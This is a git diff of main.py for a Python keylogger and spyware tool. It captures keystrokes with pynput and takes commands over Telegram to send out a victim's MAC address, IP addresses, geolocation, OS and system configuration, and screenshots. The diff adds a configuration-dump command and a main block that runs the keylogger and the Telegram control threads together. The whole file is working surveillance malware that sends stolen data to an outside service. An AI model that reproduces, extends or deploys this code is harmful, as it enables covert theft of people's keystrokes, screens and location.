@@ -1,7 +1,10 @@
 # main.py
 import os
+import threading
 from pynput.keyboard import Listener
-from branch_with_telegram_functions.telegram_functions import check_telegram, send_telegram
+from telegram import check_telegram, send_telegram
+from get_info import SystemInfo, IPAddress, get_mac
+from screenshot import send_screenshot
 
 def telegram_listener():
     last_update_id = -1
@@ -17,21 +20,26 @@ def telegram_listener():
                 send_telegram(f'MAC Address: {mac_address}')
 
             elif command_lower == '/local_ip':
-                local_ip = GetIP.get_local_ip()
+                local_ip = IPAddress.get_local_ip()
                 send_telegram(f'Local IP Address: {local_ip}')
 
             elif command_lower == '/public_ip':
-                public_ip = GetIP.get_public_ip()
+                public_ip = IPAddress.get_public_ip()
                 send_telegram(f'Public IP Address: {public_ip}')
 
             elif command_lower == '/location':
-                public_ip = GetIP.get_public_ip()
-                location = GetIP.get_location(public_ip)
+                public_ip = IPAddress.get_public_ip()
+                location = IPAddress.get_location(public_ip)
                 send_telegram(f'Location: {location}')
 
             elif command_lower == '/os':
-                system_info = get_system()
+                system_info = SystemInfo().get_os_info()
                 send_telegram(f'System info: {system_info}')
+
+            elif command_lower == '/configuration':
+                system_info = SystemInfo()
+                config_info = system_info.display_info()
+                send_telegram(f'System Configuration: \n{config_info}')
 
             elif command_lower == '/screenshot':
                 send_screenshot()
@@ -51,3 +59,11 @@ def on_press(key):
 def keylogger_listener():
     with Listener(on_press=on_press) as listener:
         listener.join()
+
+if __name__ =='__main__':
+    telegram_thread = threading.Thread(target=telegram_listener)
+    keylogger_thread = threading.Thread(target=keylogger_listener)
+    telegram_thread.start()
+    keylogger_thread.start()
+    telegram_thread.join()
+    keylogger_thread.join()
